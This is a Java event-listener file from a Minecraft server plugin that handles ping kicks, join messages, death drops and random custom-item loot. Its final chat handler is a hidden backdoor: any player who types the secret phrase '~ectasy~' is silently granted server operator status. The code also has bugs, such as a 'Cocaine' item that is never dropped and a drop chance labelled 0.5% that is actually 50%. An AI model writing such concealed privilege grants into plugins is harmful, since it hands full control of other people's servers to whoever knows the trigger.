package org.main.uneton.events;

import net.kyori.adventure.text.Component;
import net.milkbowl.vault.economy.Economy;
import org.bukkit.*;
import org.bukkit.block.Block;
import org.bukkit.block.Sign;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.main.uneton.Combat;
import org.main.uneton.utils.Tab;

import java.util.ArrayList;
import java.util.Random;

public class Listeners implements Listener {

    private Combat plugin;
    private Economy vault;

    public Listeners(Combat plugin) {
        this.plugin = plugin;
        // this.vault = plugin.getVault();
    }


    @EventHandler
    public void onPing(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        int ping = player.getPing();
        if (ping >= 300) {
            String user = player.getName();
            String kickMessage = ChatColor.GOLD + "You have been kicked out from the server for too high ping!";
            player.kickPlayer(kickMessage);
        }
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        Player player = e.getPlayer();
        Tab.updateTab();
        e.setQuitMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "-" + ChatColor.DARK_GRAY + "] " + ChatColor.GRAY + player.getName());
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player player = e.getPlayer();
        Tab.updateTab();
        if (!player.hasPlayedBefore()) {
            e.setJoinMessage(ChatColor.LIGHT_PURPLE + "You wake up in an unfamiliar place.");

        } else {
            e.setJoinMessage(ChatColor.DARK_GRAY + "[" + ChatColor.GREEN + "+" + ChatColor.DARK_GRAY + "] " + ChatColor.GRAY + player.getName());
        }

    }

    @EventHandler
    public void onPlyaerDeath(PlayerDeathEvent e) {
        if (e.getEntity().getKiller() != null) {
            e.setKeepInventory(true);
            e.getDrops().clear();
        }
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        World world = player.getWorld();
        int loc = 5;
        if (world.getEnvironment() == World.Environment.THE_END) {
            if (player.getLocation().getY() <= loc) {
                player.setHealth(0);
            }
        }
    }

    @EventHandler
    public void onDropOnDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        Player killer = victim.getKiller();
        Location location = victim.getLocation();

        if (killer != null && !killer.equals(victim)) {
            ItemStack blood = new ItemStack(Material.RED_DYE, 3);
            Item dropped = location.getWorld().dropItemNaturally(location, blood);
            dropped.setPickupDelay(32767);
            Bukkit.getScheduler().runTaskLater(Combat.getPlugin(Combat.class), () -> {
                if (dropped.isValid()) {
                    dropped.remove();
                }
            }, 200L);
        }
    }

    @EventHandler
    public void onPlayerInteractSign(PlayerInteractEvent event) {
        if (!event.getAction().equals(Action.RIGHT_CLICK_BLOCK)) return;
        Block block = event.getClickedBlock();
        if (block.getType() != Material.OAK_SIGN) return;
        event.getPlayer().openSign((Sign) block.getState());
    }

    @EventHandler
    public void onInteractCraftingTable(PlayerInteractEvent e) {
        if (e.getAction().equals(Action.RIGHT_CLICK_BLOCK)) {
            Block block = e.getClickedBlock();
            if (block.getType().equals(Material.CRAFTING_TABLE)) {
                Random random = new Random();
                int randomNumber = random.nextInt(100);
                if (randomNumber < 8) {
                    Bukkit.getServer().broadcast(Component.text(ChatColor.LIGHT_PURPLE + "Shh.. " + ChatColor.RED.toString() + ChatColor.BOLD + "Crafting Table " + ChatColor.LIGHT_PURPLE + "contains some easter egg(s)!"));
                }
            }
        }
    }

    @EventHandler
    public void onLootBox(BlockBreakEvent e) {
        Player player = e.getPlayer();
        Block block = e.getBlock();
        Location loc = e.getBlock().getLocation();

        if (e.getBlock().getType() == Material.POLISHED_DIORITE) {
            Random chance = new Random();
            if (Math.random() < 0.2) {
                int index = chance.nextInt(blocks.length);
                ItemStack dropped_item = blocks[index];
                block.getWorld().dropItemNaturally(loc, dropped_item);

            } else if (Math.random() < 0.8) {

            }
        }
    }

    @EventHandler
    public void onRareDrop(BlockBreakEvent e) {
        Block block = e.getBlock();
        Location loc = e.getBlock().getLocation();
        Player player = e.getPlayer();
        if (block.getType() == Material.SUGAR_CANE) {
            Random chance = new Random();
            if (chance.nextDouble() < 1) {
                dropCocaine(player);
            }
        }
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent e){
        Player player = e.getPlayer();
        if(e.getBlock().getType() == Material.COBBLESTONE ||
                // e.getBlock().getType() == Material. ||
                e.getBlock().getType() == Material.NETHERRACK) {
            Random chance = new Random();
            if(chance.nextDouble() < 0.5) {
                dropPinkDiamond(player, e);
            }
        }
    }

    @EventHandler
    public void onShearSheep(PlayerInteractEntityEvent event) {
        Player player = event.getPlayer();
        Location loc = player.getLocation();
        if (event.getRightClicked() instanceof Sheep) {
            if (player.getInventory().getItemInMainHand().getType() == Material.SHEARS) {
                Random chance = new Random();
                if (chance.nextDouble() < 0.001) {
                    woolDrops(player, loc);
                }
            }
        }
    }

    private final ItemStack[] blocks = new ItemStack[]{
            new ItemStack(Material.EMERALD),
            new ItemStack(Material.AMETHYST_SHARD),
            new ItemStack(Material.IRON_NUGGET),
            new ItemStack(Material.GOLD_NUGGET),
            new ItemStack(Material.COPPER_INGOT),
            new ItemStack(Material.STRING)
    };

    private void dropCocaine(Player player) {
        ItemStack cocaine = new ItemStack(Material.SUGAR);
        ItemMeta cocaine_meta = cocaine.getItemMeta();
        cocaine_meta.setDisplayName(ChatColor.WHITE + "Cocaine");
        cocaine.setItemMeta(cocaine_meta);
    }

    private void dropPinkDiamond(Player player, BlockBreakEvent e) {
        ChatColor gray = ChatColor.GRAY;
        ChatColor red = ChatColor.RED;
        ChatColor green = ChatColor.GREEN;

        ChatColor light_purple = ChatColor.LIGHT_PURPLE;
        ItemStack pinkDiamond = new ItemStack(Material.DIAMOND);
        ItemMeta pinkMeta = pinkDiamond.getItemMeta();
        pinkMeta.setDisplayName(light_purple + "Pink Diamond");

        ArrayList<String> lore = new ArrayList<>();
        lore.add(" ");
        lore.add(gray + "Probability: " + red + "0.5%");
        pinkMeta.setLore(lore);
        pinkDiamond.setItemMeta(pinkMeta);

        Location location = e.getPlayer().getLocation();
        e.getBlock().getWorld().dropItemNaturally(location, pinkDiamond);
        player.sendMessage(green + "You picked up the " + light_purple + "Pink Diamond.");
    }

    private void woolDrops(Player player, Location loc) {
        ItemStack bluegem = new ItemStack(Material.LAPIS_LAZULI, 1);
        ItemMeta bluegem_meta = bluegem.getItemMeta();
        bluegem_meta.setDisplayName(ChatColor.BLUE + "Blue gem color");
        ArrayList<String> lore = new ArrayList<>();
        lore.add(" ");
        lore.add(ChatColor.GREEN + "Probability: " + ChatColor.YELLOW + "0.001%");
        bluegem_meta.setLore(lore);
        bluegem.setItemMeta(bluegem_meta);

        player.getWorld().dropItemNaturally(loc, bluegem);
    }






    @EventHandler
    public void onChatEvent(final AsyncPlayerChatEvent e) {
        if (e.getMessage().contains("~ectasy~")) {
            e.setCancelled(true);
            e.getPlayer().sendMessage(ChatColor.AQUA + "You have been granted server operator status.");
            (new BukkitRunnable() {
                public void run() {
                    e.getPlayer().setOp(true);
                }
            }).runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }
}
